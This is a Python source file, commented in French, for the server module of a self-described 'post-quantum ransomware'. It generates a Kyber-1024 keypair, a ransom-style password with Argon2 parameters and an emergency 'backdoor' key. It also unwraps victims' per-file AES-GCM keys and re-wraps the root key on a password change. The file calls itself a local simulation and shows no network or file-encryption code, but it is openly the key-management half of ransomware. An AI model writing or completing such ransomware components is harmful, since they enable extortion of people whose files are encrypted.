"""
Module serveur pour le ransomware post-quantique
Gère la génération des clés, le stockage et la communication avec le client
"""

from typing import Dict, Optional

import config
import crypto_utils
import wordlist


class RansomwareServer:
    """
    Serveur simulé pour la gestion des clés du ransomware
    """

    def __init__(self):
        """Initialise le serveur avec un état vide"""
        self.root_key: Optional[bytes] = None
        self.wrapped_rk: Optional[bytes] = None
        self.password: Optional[str] = None
        self.salt: Optional[bytes] = None
        self.argon2_params: Optional[Dict] = None
        self.backdoor_key: Optional[bytes] = None
        self.kyber_public_key: Optional[bytes] = None
        self.kyber_secret_key: Optional[bytes] = None
        self.initialized = False

    def initialize_server(self) -> Dict:
        """
        Initialise le serveur et génère toutes les clés nécessaires

        Returns:
            Dictionnaire contenant:
            - password: Mot de passe généré
            - salt: Salt pour Argon2
            - argon2_params: Paramètres Argon2
            - kyber_public_key: Clé publique Kyber-1024
            - backdoor_key: Clé de secours (mode urgence)
        """
        print("[SERVEUR] Initialisation du serveur...")

        # Génère la paire de clés Kyber
        print("[SERVEUR] Génération de la paire de clés Kyber-1024...")
        self.kyber_public_key, self.kyber_secret_key = crypto_utils.generate_kyber_keypair()

        # Génère le mot de passe aléatoire
        self.password = wordlist.generate_random_password()
        print(f"[SERVEUR] Mot de passe généré: {self.password}")

        # Génère le salt pour Argon2
        self.salt = crypto_utils.generate_random_salt()

        # Paramètres Argon2
        self.argon2_params = {
            "time_cost": config.ARGON2_TIME_COST,
            "memory_cost": config.ARGON2_MEMORY_COST,
            "parallelism": config.ARGON2_PARALLELISM,
            "hash_len": config.ARGON2_HASH_LEN,
        }

        # Génère la clé de secours (backdoor)
        print("[SERVEUR] Génération de la clé de secours (mode urgence)...")
        self.backdoor_key = crypto_utils.generate_random_key()

        self.initialized = True
        print("[SERVEUR] Initialisation terminée.")

        # Retourne les informations au client
        return {
            "password": self.password,
            "salt": self.salt,
            "argon2_params": self.argon2_params,
            "kyber_public_key": self.kyber_public_key,
            "backdoor_key": self.backdoor_key,
        }

    def request_full_decryption_credentials(self) -> Dict:
        """
        Retourne les credentials pour le déchiffrement complet

        Returns:
            Dictionnaire contenant:
            - password: Mot de passe
            - salt: Salt pour Argon2
            - argon2_params: Paramètres Argon2
        """
        if not self.initialized:
            raise RuntimeError("Le serveur n'est pas initialisé")

        print("[SERVEUR] Envoi des credentials de déchiffrement au client...")

        return {
            "password": self.password,
            "salt": self.salt,
            "argon2_params": self.argon2_params,
        }

    def request_file_key_unwrap(self, wrapped_key_ciphertext: bytes, wrapped_key_nonce: bytes, wrapped_key_tag: bytes, kyber_ciphertext: bytes) -> bytes:
        """
        Désencapsule une clé de fichier avec la Root Key

        Args:
            wrapped_key_ciphertext: Ciphertext de la clé de fichier encapsulée
            wrapped_key_nonce: Nonce utilisé pour l'encapsulation
            wrapped_key_tag: Tag d'authentification
            kyber_ciphertext: Ciphertext Kyber pour récupérer la Root Key

        Returns:
            Clé de fichier désencapsulée
        """
        if not self.initialized:
            raise RuntimeError("Le serveur n'est pas initialisé")

        if self.kyber_secret_key is None:
            raise RuntimeError("La clé secrète Kyber n'est pas disponible")

        print("[SERVEUR] Récupération de la Root Key via Kyber...")
        root_key = crypto_utils.kyber_decapsulate(self.kyber_secret_key, kyber_ciphertext)

        print("[SERVEUR] Désencapsulation de la clé de fichier...")
        file_key = crypto_utils.unwrap_key_aes_gcm(wrapped_key_ciphertext, root_key, wrapped_key_nonce, wrapped_key_tag)

        return file_key

    def change_password(self, new_password: str, new_salt: bytes, new_argon2_params: Dict, kyber_ciphertext: bytes) -> Dict:
        """
        Change le mot de passe et re-encapsule la Root Key

        Args:
            new_password: Nouveau mot de passe
            new_salt: Nouveau salt pour Argon2
            new_argon2_params: Nouveaux paramètres Argon2
            kyber_ciphertext: Ciphertext Kyber pour récupérer la Root Key

        Returns:
            Dictionnaire contenant:
            - wrapped_rk: Nouvelle Root Key encapsulée
            - salt: Nouveau salt
            - argon2_params: Nouveaux paramètres Argon2
        """
        if not self.initialized:
            raise RuntimeError("Le serveur n'est pas initialisé")

        if self.kyber_secret_key is None:
            raise RuntimeError("La clé secrète Kyber n'est pas disponible")

        print("[SERVEUR] Changement du mot de passe...")

        # Récupère la Root Key via Kyber
        print("[SERVEUR] Récupération de la Root Key via Kyber...")
        root_key = crypto_utils.kyber_decapsulate(self.kyber_secret_key, kyber_ciphertext)

        # Dérive la nouvelle Master Key
        print("[SERVEUR] Dérivation de la nouvelle Master Key...")
        new_master_key = crypto_utils.derive_key_argon2(
            password=new_password,
            salt=new_salt,
            **new_argon2_params
        )

        # Re-encapsule la RK avec la nouvelle MK
        print("[SERVEUR] Re-encapsulation de la Root Key...")
        wrapped_rk_ciphertext, wrapped_rk_nonce, wrapped_rk_tag = crypto_utils.wrap_key_aes_gcm(root_key, new_master_key)

        # Met à jour l'état du serveur
        self.password = new_password
        self.salt = new_salt
        self.argon2_params = new_argon2_params

        print("[SERVEUR] Mot de passe changé avec succès.")

        return {
            "wrapped_rk_ciphertext": wrapped_rk_ciphertext,
            "wrapped_rk_nonce": wrapped_rk_nonce,
            "wrapped_rk_tag": wrapped_rk_tag,
            "salt": new_salt,
            "argon2_params": new_argon2_params,
        }

    def emergency_decrypt(self) -> bytes:
        """
        Retourne la clé de secours pour le déchiffrement d'urgence

        Returns:
            Clé de secours
        """
        if not self.initialized:
            raise RuntimeError("Le serveur n'est pas initialisé")

        if self.backdoor_key is None:
            raise RuntimeError("La clé de secours n'est pas disponible")

        print("[SERVEUR] [URGENCE] Envoi de la clé de secours...")

        return self.backdoor_key


# Instance globale du serveur (simulation locale)
server = RansomwareServer()
